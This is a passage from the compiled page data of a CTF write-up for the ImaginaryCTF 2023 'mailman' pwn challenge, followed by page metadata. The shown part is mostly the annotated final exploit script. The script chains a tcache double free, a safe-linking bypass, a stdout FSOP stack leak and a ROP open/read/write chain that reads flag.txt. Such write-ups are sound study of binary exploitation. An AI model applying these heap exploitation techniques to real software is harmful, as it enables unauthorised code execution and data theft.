operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate our prev block and our victim block, along with the buffer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'prev'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'victim'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'flag.txt\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Fill the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our previous chunk (they are now consolidated)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Open up a slot in the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# double free vulnerablity, now victim is in the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We\\u2019re going to write to it the necessary padding then:\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# 0x211, to preserve the size of the victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# stdout ^ ((heap + 0x3320) >> 12), because we need to pass a safe-linked ptr.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Otherwise, malloc will crash. 0x3320 offset was found via debugging.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# remove victim from the tcache again, updating the linked list structure\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# This alloc writes to stdout. It sets stdout\\u2019s write buffer to be environ, and sets flags to cause it to flush on next print\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:'# When printf(\"> \") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x258\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# offset computed in gdb\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Stack Leak: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Setup our ROP chain through libc.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use that buffer block as a flag buffer (offsets found through gdb)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    flagoffset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5f520\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5c000\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" flagoffset\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Just make the area after the flag chunk our buffer, its probably writable.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    output \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Flag.txt: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use rop call to automatically generate function calls\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our forged chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write to our forged chunk (which again contains the metadata to victim)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# alloc our victim chunk again.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'xxx'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# allocs to somewhere on stack before _IO_file_underflow to hijack the return address of it.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'A'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc8\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" __name__ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"__main__\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    main\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})]})}}var g=_;return w;})();\n;return Component;","toc":[{"value":"mailman (423pts, 31 solves)","url":"#mailman-423pts-31-solves","depth":1},{"value":"Table of Contents","url":"#table-of-contents","depth":2},{"value":"My mailman has secrets ","url":"#my-mailman-has-secrets-","depth":2},{"value":"Leaky Program ","url":"#leaky-program-","depth":2},{"value":"One More Leak, now with cakes! ","url":"#one-more-leak-now-with-cakes-","depth":2},{"value":"ROP? I Like FSOP. ","url":"#rop-i-like-fsop-","depth":2},{"value":"FSOP? I Like ROP. ","url":"#fsop-i-like-rop-","depth":2},{"value":"TLDR ","url":"#tldr-","depth":2},{"value":"Full Script (Annotated) ","url":"#full-script-annotated-","depth":2}],"frontMatter":{"readingTime":{"text":"49 min read","minutes":48.865,"time":2931900,"words":9773},"slug":"imaginary-ctf-2023/mailman","fileName":"imaginary-ctf-2023/mailman.md","title":"ImaginaryCTF 2023  mailman","date":"2023-07-24T00:00:00.000Z","draft":false,"authors":["surg"],"tags":["Imaginary CTF 2023","Assembly","x86_64","Reverse Engineering","Binary Exploitation","Pwn"],"summary":"Because *every* protection had to be on.","canonical":"https://surg.dev/ictf23/"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["surg"],"fileName":"surg.md","name":"Surg","avatar":"https://www.gravatar.com/avatar/731fa44fbe6dc1baa4352a7e640bc73a?d=identicon&s=256","specialties":["Pwn","Reverse"],"twitter":"https://twitter.com/Sam_Ruggerio","web":"https://surg.dev","github":"https://github.com/Surg-Dev","linkedin":"https://www.linkedin.com/in/surgdev","member":true,"order":22,"description":"Security guy and CS theory enthusiast","date":null}],"prev":{"title":"CrewCTF 2023","date":"2023-07-08T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["Crew CTF 2023","Web3","Blockchain","Smart Contract","Solidity"],"canonical":"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/positive/","summary":"Web3 Writeup Compilation for CrewCTF 2023","slug":"crew-ctf-2023/web3"},"next":{"title":"Intigriti 0823  August XSS Challenge","date":"2023-08-29T00:00:00.000Z","draft":false,"authors":["iyed"],"tags":["Intigriti 0823","XSS","Web","JavaScript"],"summary":"Writeup for Intigriti August XSS challenge by huli.","slug":"intigriti-0823/writeup"}},"__N_SSG":true}